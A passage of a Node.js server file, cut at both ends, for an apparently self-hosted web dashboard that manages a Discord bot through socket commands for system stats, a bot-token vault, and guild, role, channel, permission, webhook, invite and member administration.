    channels, roles, members, categories
  });
}

registerCommand('get_recent_logs')(async (params, { socket }) => {
  socket.emit('recent_logs', { messages: [...LOG_BUFFER] });
});

function sampleCpuPercent() {
  return new Promise((resolve) => {
    const c1 = os.cpus();
    setTimeout(() => {
      const c2 = os.cpus();
      let total = 0, idle = 0;
      for (let i = 0; i < c2.length; i++) {
        const t1 = c1[i] ? c1[i].times : {};
        const t2 = c2[i].times;
        for (const k of Object.keys(t2)) {
          const d = (t2[k] || 0) - (t1[k] || 0);
          total += d;
          if (k === 'idle') idle += d;
        }
      }
      if (total > 0) {
        resolve(Math.max(0, Math.min(100, Math.round(100 * (1 - idle / total)))));
      } else {
        const cores = c2.length || 1;
        resolve(Math.max(0, Math.min(100, Math.round((os.loadavg()[0] / cores) * 100))));
      }
    }, 500);
  });
}

registerCommand('get_system_stats')(async (params, { socket }) => {
  const b = bot;
  const info = {
    ping: b ? Math.round(b.ws.ping) : 0,
    uptime: 0,
    memory_total: 'N/A',
    memory_used: 'N/A',
    memory_percent: 0,
    cpu_percent: 0,
    device: os.hostname() || 'Unknown',
    os: `${os.type()} ${os.release()}`,
    bot_name: b ? b.user.tag : 'Not connected',
    bot_avatar: b ? getAvatarUrl(b.user) : null,
    owner: 'Unknown',
    guilds: b ? b.guilds.cache.size : 0,
    users: b ? b.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0) : 0
  };
  if (b && b.startTime) {
    const now = new Date();
    info.uptime = Math.round((now - b.startTime) / 1000);
  }
  try {
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    info.memory_total = `${Math.floor(totalMem / (1024**2))} MB`;
    info.memory_used = `${Math.floor(usedMem / (1024**2))} MB`;
    info.memory_percent = Math.round((usedMem / totalMem) * 100);
    info.cpu_percent = await sampleCpuPercent();
  } catch {}
  if (b && b.user) {
    const app = await fetchBotApplicationInfo(b);
    if (app && app.owner) info.owner = app.owner.tag;
  }
  socket.emit('system_stats', info);
});

registerCommand('clear_runtime_cache')(async (params, { socket }) => {
  guildListCache = [];
  for (const key of RATE_LIMIT_BUCKETS.keys()) RATE_LIMIT_BUCKETS.delete(key);
  if (bot && bot.isReady()) {
    guildListCache = await getGuildListWithBanners(bot);
    io.emit('bot_status', { connected: true, guilds: guildListCache });
  }
  socket.emit('notification', 'Runtime cache cleared');
  socket.emit('system_stats_cleared', {});
});

registerCommand('shutdown_bot')(async (params, { socket }) => {
  socket.emit('shutdown_progress', { step: 'Clearing leftover cache...' });
  guildListCache = [];
  for (const key of RATE_LIMIT_BUCKETS.keys()) RATE_LIMIT_BUCKETS.delete(key);
  if (bot && !bot.isDestroyed) {
    await bot.destroy();
  }
  socket.emit('shutdown_progress', { step: 'Logging out bot...' });
  await new Promise(resolve => setTimeout(resolve, 1000));
  socket.emit('shutdown_progress', { step: 'Disconnecting socket...' });
  await new Promise(resolve => setTimeout(resolve, 1000));
  socket.emit('shutdown_progress', { step: 'Shutdown complete. Goodbye!' });
  await new Promise(resolve => setTimeout(resolve, 1000));
  process.exit(0);
});

registerCommand('server_overview_save')(async (params, { socket }) => {
  const guildId = params.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const updateData = {};
  if ('name' in params) updateData.name = params.name;
  if ('description' in params) updateData.description = params.description;
  if ('verification_level' in params) updateData.verificationLevel = parseInt(params.verification_level);
  if ('explicit_content_filter' in params) updateData.explicitContentFilter = parseInt(params.explicit_content_filter);
  if ('afk_channel_id' in params) {
    const afkChannel = guild.channels.cache.get(params.afk_channel_id) || null;
    updateData.afkChannel = afkChannel;
  }
  if ('afk_timeout' in params) updateData.afkTimeout = parseInt(params.afk_timeout);
  if (params.icon_b64) {
    try {
      updateData.icon = Buffer.from(params.icon_b64, 'base64');
    } catch {}
  }
  if (params.banner_b64) {
    try {
      updateData.banner = Buffer.from(params.banner_b64, 'base64');
    } catch {}
  }
  if (params.splash_b64) {
    try {
      updateData.splash = Buffer.from(params.splash_b64, 'base64');
    } catch {}
  }
  if (Object.keys(updateData).length > 0) {
    try {
      await guild.edit(updateData);
      socket.emit('notification', 'Settings saved');
    } catch (e) {
      if (e.code === 50013) socket.emit('error', { message: 'Missing permission to edit guild' });
      else {
        logger.error(`Edit guild error: ${e.message}`);
        socket.emit('error', { message: 'Failed to save settings' });
      }
    }
  }
});

registerCommand('dashboard_get_prefs')(async (params, { socket }) => {
  socket.emit('dashboard_prefs', loadDashboardPrefs());
});

registerCommand('dashboard_save_pref')(async (params, { socket }) => {
  const key = params.key;
  const value = params.value;
  if (!key) return;
  const prefs = loadDashboardPrefs();
  if (key in prefs) {
    prefs[key] = value;
    saveDashboardPrefs(prefs);
  }
  socket.emit('pref_saved', { key, value });
});

registerCommand('add_token')(async (params, { socket }) => {
  const token = (params.token || '').trim();
  if (!token) return;
  tokenVault.push({ token, name: '', avatar: '' });
  saveEncryptedTokens(tokenVault);
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i+1}`, avatar: t.avatar || '' })),
    active_index: (bot && !bot.isDestroyed) ? currentBotTokenIndex : -1
  });
});

registerCommand('remove_token')(async (params, { socket }) => {
  const idx = parseInt(params.index);
  if (!isNaN(idx) && idx >= 0 && idx < tokenVault.length) {
    tokenVault.splice(idx, 1);
    saveEncryptedTokens(tokenVault);
  }
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i+1}`, avatar: t.avatar || '' })),
    active_index: (bot && !bot.isDestroyed) ? currentBotTokenIndex : -1
  });
});

registerCommand('token_list')(async (params, { socket }) => {
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i+1}`, avatar: t.avatar || '' })),
    active_index: (bot && !bot.isDestroyed) ? currentBotTokenIndex : -1
  });
});

registerCommand('bot_profile_get')(async (params, { socket }) => {
  const token = bot && bot._loginToken ? bot._loginToken : null;
  if (!token) { socket.emit('error', { message: 'Bot not connected' }); return; }
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bot ' + token } });
    if (!res.ok) { socket.emit('error', { message: 'Failed to fetch profile' }); return; }
    const u = await res.json();
    const ext = u.avatar && u.avatar.startsWith('a_') ? 'gif' : 'png';
    socket.emit('bot_profile', {
      username: u.username,
      bio: u.bio || '',
      avatar_url: u.avatar ? 'https://cdn.discordapp.com/avatars/' + u.id + '/' + u.avatar + '.' + ext + '?size=128' : null,
      banner_url: u.banner ? 'https://cdn.discordapp.com/banners/' + u.id + '/' + u.banner + '.png?size=512' : null
    });
  } catch (e) { socket.emit('error', { message: e.message }); }
});
registerCommand('bot_profile_save')(async (params, { socket }) => {
  const token = bot && bot._loginToken ? bot._loginToken : null;
  if (!token) { socket.emit('error', { message: 'Bot not connected' }); return; }
  const body = {};
  if (params.avatar) body.avatar = params.avatar;
  if (params.banner) body.banner = params.banner;
  if (typeof params.bio === 'string') body.bio = params.bio;
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      method: 'PATCH',
      headers: { Authorization: 'Bot ' + token, 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    if (!res.ok) { const t = await res.text(); socket.emit('error', { message: 'Discord error ' + res.status + ': ' + t.slice(0, 140) }); return; }
    socket.emit('notification', 'Global identity saved');
  } catch (e) { socket.emit('error', { message: e.message }); }
});

registerCommand('bot_server_profile_get')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guild = bot.guilds.cache.get(params.guild_id);
  if (!guild) return;
  const me = guild.members.me;
  socket.emit('bot_server_profile', {
    guild_id: guild.id,
    nickname: me.nickname || '',
    bio: me.bio || '',
    avatar_url: me.avatar ? me.avatarURL({ dynamic: true, size: 128 }) : null,
    banner_url: me.banner ? me.bannerURL({ format: 'png', size: 512 }) : null
  });
});
registerCommand('bot_server_profile_save')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) { socket.emit('error', { message: 'Bot not connected' }); return; }
  const guild = bot.guilds.cache.get(params.guild_id);
  if (!guild) { socket.emit('error', { message: 'Server not found' }); return; }
  const update = {};
  if ('nickname' in params) update.nick = params.nickname || null;
  if ('avatar' in params) update.avatar = params.avatar;
  if ('banner' in params) update.banner = params.banner;
  if ('bio' in params) update.bio = params.bio || '';
  try {
    if (typeof guild.members.editMe === 'function') await guild.members.editMe(update);
    else await guild.members.me.edit(update);
    socket.emit('notification', 'Server profile saved');
    guildListCache = await getGuildListWithBanners(bot);
    io.emit('bot_status', { connected: true, guilds: guildListCache });
  } catch (e) { socket.emit('error', { message: e.message }); }
});

registerCommand('server_roles_create')(async (params, { socket }) => {
  const guildId = params.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const name = params.name || 'new-role';
  const color = parseInt(params.color) || 0;
  const hoist = params.hoist || false;
  const mentionable = params.mentionable || false;
  try {
    await guild.roles.create({ name, color, hoist, mentionable });
    socket.emit('notification', `Role ${name} created`);
  } catch (e) {
    if (e.code === 50013) socket.emit('error', { message: 'Missing permission to create role' });
    else logger.error(`Create role error: ${e.message}`);
  }
});

registerCommand('server_roles_edit')(async (params, { socket }) => {
  const guildId = params.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const roleId = params.id;
  const role = guild.roles.cache.get(roleId);
  if (!role) return;
  const updateData = {};
  if ('name' in params) updateData.name = params.name;
  if ('color' in params) updateData.color = parseInt(params.color);
  if ('hoist' in params) updateData.hoist = params.hoist;
  if ('mentionable' in params) updateData.mentionable = params.mentionable;
  if ('permissions' in params) updateData.permissions = BigInt(params.permissions);
  if (Object.keys(updateData).length > 0) {
    try {
      await role.edit(updateData);
      socket.emit('notification', `Role ${role.name} updated`);
    } catch (e) {
      logger.error(`Edit role error: ${e.message}`);
    }
  }
});

registerCommand('server_roles_delete')(async (params, { socket }) => {
  const guildId = params.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const roleId = params.id;
  const role = guild.roles.cache.get(roleId);
  if (role) {
    try {
      await role.delete();
      socket.emit('notification', `Role ${role.name} deleted`);
    } catch (e) {
      if (e.code === 50013) socket.emit('error', { message: 'Missing permission to delete role' });
      else logger.error(`Delete role error: ${e.message}`);
    }
  }
});

registerCommand('server_roles_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const roles = guild.roles.cache.sort((a,b) => b.position - a.position).map(role => ({
    id: String(role.id), name: role.name, color: role.color,
    position: role.position, hoist: role.hoist, mentionable: role.mentionable,
    permissions: Number(role.permissions.bitfield), managed: role.managed, members: role.members.size
  }));
  socket.emit('server_roles_data', { roles });
});

registerCommand('server_members_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const members = guild.members.cache.map(member => ({
    id: String(member.id),
    name: member.displayName,
    username: member.user.tag,
    avatar_url: getAvatarUrl(member.user)
  }));
  socket.emit('server_members_list', { members });
});

registerCommand('server_sticker_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const stickers = guild.stickers.cache.map(sticker => ({
    id: String(sticker.id),
    name: sticker.name,
    description: sticker.description || '',
    url: sticker.url || null
  }));
  socket.emit('server_sticker_data', { stickers });
});

registerCommand('fetch_user_profile')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const userId = params.user_id;
  if (!userId) return;
  const user = await bot.users.fetch(userId).catch(() => null);
  if (!user) return;
  let member = null;
  let guild = null;
  const guildId = params.guild_id;
  if (guildId) {
    guild = bot.guilds.cache.get(guildId);
    member = guild ? guild.members.cache.get(userId) : null;
  }
  if (!member) {
    for (const g of bot.guilds.cache.values()) {
      const m = g.members.cache.get(userId);
      if (m) {
        member = m;
        if (!guild) guild = g;
        break;
      }
    }
  }
  const profile = {
    id: String(user.id),
    name: user.displayName,
    display_name: user.displayName,
    avatar_url: getAvatarUrl(user),
    banner_url: getUserBannerUrl(user),
    accent_color: user.accentColor || null,
    bio: user.bio || ''
  };
  if (member && guild) {
    profile.nick = member.nickname;
    profile.joined_at = member.joinedAt ? member.joinedAt.toISOString() : null;
    profile.roles = member.roles.cache.filter(r => r.name !== '@everyone').map(r => ({ name: r.name, color: r.color }));
    profile.status = member.presence?.status || 'offline';
    let customStatus = '';
    for (const act of member.presence?.activities || []) {
      if (act.type === ActivityType.Custom) {
        customStatus = act.name || '';
        break;
      }
    }
    profile.custom_status = customStatus;
  } else {
    profile.status = 'offline';
    profile.custom_status = '';
  }
  socket.emit('user_profile', profile);
});

registerCommand('guild_structure')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const categories = [];
  const uncategorised = [];
  for (const cat of guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).values()) {
    const chans = [];
    for (const ch of guild.channels.cache.filter(c => c.parentId === cat.id).values()) {
      if (ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice) {
        chans.push({ id: String(ch.id), name: ch.name, type: ch.type === ChannelType.GuildText ? 'text' : 'voice', position: ch.position });
      }
    }
    categories.push({ id: String(cat.id), name: cat.name, position: cat.position, channels: chans });
  }
  for (const ch of guild.channels.cache.values()) {
    if (!ch.parent && (ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice)) {
      uncategorised.push({ id: String(ch.id), name: ch.name, type: ch.type === ChannelType.GuildText ? 'text' : 'voice', position: ch.position });
    }
  }
  socket.emit('guild_structure', { categories, uncategorised });
});

registerCommand('channel_get')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const data = {
    id: String(channel.id),
    name: channel.name,
    type: channel.type === ChannelType.GuildText ? 'text' : 'voice',
    position: channel.position,
    category_id: channel.parent ? String(channel.parent.id) : null,
    topic: channel.topic || '',
    slowmode: channel.rateLimitPerUser || 0,
    nsfw: channel.nsfw || false,
    private: channel.permissionOverwrites.cache.size > 0
  };
  socket.emit('channel_info', data);
});

registerCommand('channel_create')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const name = params.name || 'new-channel';
  const chType = params.type || 'text';
  const categoryId = params.category_id;
  const private = params.private || false;
  try {
    let channel;
    if (chType === 'text') {
      channel = await guild.channels.create({ name, type: ChannelType.GuildText });
    } else if (chType === 'voice') {
      channel = await guild.channels.create({ name, type: ChannelType.GuildVoice });
    } else return;
    if (categoryId) {
      const cat = guild.channels.cache.get(categoryId);
      if (cat && cat.type === ChannelType.GuildCategory) {
        await channel.setParent(cat);
      }
    }
    if (private) {
      await channel.permissionOverwrites.create(guild.roles.everyone, { ViewChannel: false });
    }
    socket.emit('notification', `Channel ${name} created`);
  } catch (e) {
    logger.error(`Create channel error: ${e.message}`);
  }
});

registerCommand('channel_edit')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const updateData = {};
  if ('name' in params) updateData.name = params.name;
  if ('topic' in params && channel.type === ChannelType.GuildText) updateData.topic = params.topic;
  if ('slowmode' in params && channel.type === ChannelType.GuildText) updateData.rateLimitPerUser = parseInt(params.slowmode);
  if ('nsfw' in params && channel.type === ChannelType.GuildText) updateData.nsfw = params.nsfw;
  if ('category_id' in params) {
    const cat = params.category_id ? guild.channels.cache.get(params.category_id) : null;
    if (cat && cat.type === ChannelType.GuildCategory) updateData.parent = cat;
    else if (params.category_id === null) updateData.parent = null;
  }
  if (Object.keys(updateData).length > 0) {
    try {
      await channel.edit(updateData);
      socket.emit('notification', `Channel ${channel.name} updated`);
    } catch (e) {
      logger.error(`Edit channel error: ${e.message}`);
    }
  }
  if ('private' in params) {
    if (params.private) {
      await channel.permissionOverwrites.create(guild.roles.everyone, { ViewChannel: false });
    } else {
      await channel.permissionOverwrites.create(guild.roles.everyone, { ViewChannel: true });
    }
  }
});

registerCommand('channel_delete')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (channel) {
    try {
      await channel.delete();
      socket.emit('notification', `Channel ${channel.name} deleted`);
    } catch (e) {
      logger.error(`Delete channel error: ${e.message}`);
    }
  }
});

registerCommand('category_create')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const name = params.name || 'New Category';
  const private = params.private || false;
  try {
    const cat = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    if (private) {
      await cat.permissionOverwrites.create(guild.roles.everyone, { ViewChannel: false });
    }
    socket.emit('notification', `Category ${name} created`);
  } catch (e) {
    logger.error(`Create category error: ${e.message}`);
  }
});

registerCommand('category_delete')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const catId = params.category_id;
  if (!catId) return;
  const cat = guild.channels.cache.get(catId);
  if (cat && cat.type === ChannelType.GuildCategory) {
    try {
      await cat.delete();
    } catch (e) {
      logger.error(`Delete category error: ${e.message}`);
    }
  }
});

registerCommand('channel_permissions_get')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const overwrites = [];
  for (const [targetId, overwrite] of channel.permissionOverwrites.cache) {
    let targetType, targetName, target;
    if (guild.roles.cache.has(targetId)) {
      targetType = 'role';
      target = guild.roles.cache.get(targetId);
      targetName = target.name;
    } else if (guild.members.cache.has(targetId)) {
      targetType = 'member';
      target = guild.members.cache.get(targetId);
      targetName = target.displayName;
    } else continue;
    const allowed = bitsToPermissions(overwrite.allow.bitfield);
    const denied = bitsToPermissions(overwrite.deny.bitfield);
    overwrites.push({
      id: String(targetId),
      name: targetName,
      type: targetType,
      allowed,
      denied
    });
  }
  socket.emit('channel_permissions', { channel_id: channelId, overwrites });
});

registerCommand('channel_permissions_set')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  const targetId = params.target_id;
  const targetType = params.target_type || 'role';
  const permission = params.permission;
  const action = params.action;
  if (!channelId || !targetId || !permission || !action) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  let target;
  if (targetType === 'role') target = guild.roles.cache.get(targetId);
  else target = guild.members.cache.get(targetId);
  if (!target) return;
  const flag = permissionNameToFlag(permission);
  if (!flag) return;
  let overwrite = channel.permissionOverwrites.cache.get(targetId);
  if (!overwrite) {
    overwrite = { allow: new Permissions(), deny: new Permissions() };
  } else {
    overwrite = { allow: overwrite.allow.clone(), deny: overwrite.deny.clone() };
  }
  if (action === 'allow') overwrite.allow.add(flag);
  else if (action === 'deny') overwrite.deny.add(flag);
  else if (action === 'neutral') {
    overwrite.allow.remove(flag);
    overwrite.deny.remove(flag);
  }
  try {
    await channel.permissionOverwrites.create(target, {
      allow: overwrite.allow,
      deny: overwrite.deny
    });
  } catch (e) {
    logger.error(`Set permissions error: ${e.message}`);
  }
});

registerCommand('settings_upload_logo')(async (params, { socket }) => {
  const imageB64 = params.image || '';
  if (!imageB64) {
    socket.emit('error', { message: 'No image data' });
    return;
  }
  try {
    const imageBytes = Buffer.from(imageB64, 'base64');
    const iconsDir = path.join(SYS_DIR, 'icons');
    fs.mkdirSync(iconsDir, { recursive: true });
    for (const old of fs.readdirSync(iconsDir)) {
      if (old.startsWith('sidebar-logo')) {
        fs.unlinkSync(path.join(iconsDir, old));
      }
    }
    let ext = 'png';
    if (imageB64.startsWith('/9j/')) ext = 'jpg';
    else if (imageB64.startsWith('R0lGOD')) ext = 'gif';
    const filename = `sidebar-logo.${ext}`;
    fs.writeFileSync(path.join(iconsDir, filename), imageBytes);
    socket.emit('notification', 'Logo uploaded');
    socket.emit('logo_updated', { url: `/sys-icons/${filename}` });
  } catch (e) {
    socket.emit('error', { message: 'Invalid image data' });
  }
});

registerCommand('channel_webhooks')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const webhooks = [];
  try {
    const webhookCollection = await channel.fetchWebhooks();
    for (const wh of webhookCollection.values()) {
      webhooks.push({
        id: String(wh.id),
        name: wh.name,
        url: wh.url,
        channel_id: String(wh.channelId)
      });
    }
  } catch (e) {
    logger.error(`Get webhooks error: ${e.message}`);
  }
  socket.emit('channel_webhooks', { channel_id: channelId, webhooks });
});

registerCommand('webhook_create')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  const name = params.name || 'Arklum Webhook';
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  try {
    const wh = await channel.createWebhook({ name });
    socket.emit('notification', `Webhook ${wh.name} created`);
  } catch (e) {
    logger.error(`Create webhook error: ${e.message}`);
  }
});

registerCommand('webhook_edit')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const webhookId = params.id;
  if (!webhookId) return;
  const updateData = {};
  if ('name' in params) updateData.name = params.name;
  if ('channel_id' in params && params.channel_id) {
    let guildId = params.guild_id;
    if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
    const guild = guildId ? bot.guilds.cache.get(guildId) : null;
    if (guild) {
      const channel = guild.channels.cache.get(params.channel_id);
      if (channel) updateData.channel = channel;
    }
  }
  if (Object.keys(updateData).length > 0) {
    try {
      const webhook = await bot.fetchWebhook(webhookId);
      await webhook.edit(updateData);
    } catch (e) {
      logger.error(`Edit webhook error: ${e.message}`);
    }
  }
});

registerCommand('webhook_delete')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const webhookId = params.id;
  if (!webhookId) return;
  try {
    const webhook = await bot.fetchWebhook(webhookId);
    await webhook.delete();
  } catch (e) {
    logger.error(`Delete webhook error: ${e.message}`);
  }
});

registerCommand('channel_pins')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const pins = [];
  try {
    const pinnedMsgs = await channel.messages.fetchPinned();
    for (const msg of pinnedMsgs.values()) {
      pins.push({
        id: String(msg.id),
        author: msg.author.tag,
        content: msg.content.substring(0,200),
        timestamp: msg.createdAt.toISOString().slice(0,19).replace('T',' ')
      });
    }
  } catch (e) {
    logger.error(`Get pins error: ${e.message}`);
  }
  socket.emit('channel_pins', { channel_id: channelId, pins });
});

registerCommand('channel_unpin')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  const messageId = params.message_id;
  if (!validateId(channelId) || !validateId(messageId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  try {
    const msg = await channel.messages.fetch(messageId);
    await msg.unpin();
  } catch (e) {
    logger.error(`Unpin error: ${e.message}`);
  }
});

registerCommand('channel_invites')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  if (!validateId(channelId)) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  const invites = [];
  try {
    const inviteCollection = await channel.fetchInvites();
    for (const inv of inviteCollection.values()) {
      invites.push({
        code: inv.code,
        url: inv.url,
        uses: inv.uses,
        max_uses: inv.maxUses,
        max_age: inv.maxAge,
        temporary: inv.temporary,
        created_at: inv.createdAt ? inv.createdAt.toISOString().slice(0,19).replace('T',' ') : ''
      });
    }
  } catch (e) {
    logger.error(`Get invites error: ${e.message}`);
  }
  socket.emit('channel_invites', { channel_id: channelId, invites });
});

registerCommand('channel_invite_revoke')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const code = params.code;
  if (!code) return;
  try {
    const invite = await bot.fetchInvite(code);
    await invite.delete();
  } catch (e) {
    logger.error(`Revoke invite error: ${e.message}`);
  }
});

registerCommand('channel_move_absolute')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const channelId = params.channel_id;
  const newPos = params.position;
  if (!validateId(channelId) || newPos === undefined) return;
  const channel = guild.channels.cache.get(channelId);
  if (!channel) return;
  try {
    await channel.edit({ position: parseInt(newPos) });
  } catch (e) {
    logger.error(`Channel move absolute error: ${e.message}`);
  }
});

registerCommand('member_timeout')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const userId = params.user_id;
  const duration = parseInt(params.duration) || 60;
  if (!validateId(userId)) return;
  const member = guild.members.cache.get(userId);
  if (!member) return;
  try {
    await member.timeout(duration * 1000);
    socket.emit('notification', `${member.displayName} timed out for ${duration}s`);
  } catch (e) {
    logger.error(`Timeout error: ${e.message}`);
  }
});

registerCommand('role_members_list')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  let guildId = params.guild_id;
  if (!guildId && bot.guilds.cache.size > 0) guildId = bot.guilds.cache.first().id;
  const guild = guildId ? bot.guilds.cache.get(guildId) : null;
  if (!guild) return;
  const roleId = params.role_id;
  const role = guild.roles.cache.get(roleId);
  if (!role) return;
  const members = role.members.map(member => ({
    id: String(member.id),
    name: member.displayName,
    username: member.user.tag
  }));
  socket.emit('role_members', { role_id: roleId, members });
});

registerCommand('category_permissions_get')(async (params, { socket }) => {
  if (!bot || !bot.isReady()) return;
  const guildId = params.guild_id;
  if (!guildId) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const catId = params.category_id;
  const cat = guild.channels.cache.get(catId);
  if (!cat || cat.type !== ChannelType.GuildCategory) return;
  const overwrites = [];
  for (const [targetId, overwrite] of cat.permissionOverwrites.cache) {
    let targetType, targetName, target;
    if (guild.roles.cache.has(targetId)) {
      targetType = 'role';
      target = guild.roles.cache.get(targetId);
      targetName = target.name;
    } else if (guild.members.cache.has(targetId)) {
      targetType = 'member';
      target = guild.members.cache.get(targetId);
      targetName = target.displayName;
    } else continue;
    const allowed = bitsToPermissions(overwrite.allow.bitfield);
    const denied = bitsToPermissions(overwrite.deny.bitfield);
    overwrites.push({
      id: String(targetId),
